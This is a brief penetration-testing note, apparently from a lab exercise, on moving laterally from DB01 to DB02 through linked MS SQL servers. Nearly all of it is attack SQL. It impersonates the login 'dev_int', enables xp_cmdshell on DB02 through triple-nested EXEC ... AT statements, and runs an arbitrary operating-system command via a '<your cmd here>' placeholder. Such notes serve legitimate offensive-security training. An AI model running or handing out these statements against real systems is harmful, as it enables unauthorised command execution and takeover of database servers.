# Lateral movement to DB02

When you are on MS SQL of DB01 (when using WEB01$ machine account and impacket-mssql), you can perform code execution on DB02 using the same technique as for DB01, but using triple-hop:  
```sql
EXECUTE AS LOGIN = 'dev_int';  
EXEC ('EXEC (''EXEC ('''' sp_configure ''''''''show advanced options'''''''', 1; reconfigure; '''') AT db02 '') AT db01') AT db02
EXEC ('EXEC (''EXEC ('''' sp_configure ''''''''xp_cmdshell'''''''', 1; reconfigure; '''') AT db02 '') AT db01') AT db02
EXEC ('EXEC (''EXEC ('''' xp_cmdshell ''''''''<your cmd here>'''''''' '''') AT db02 '') AT db01') AT db02
```
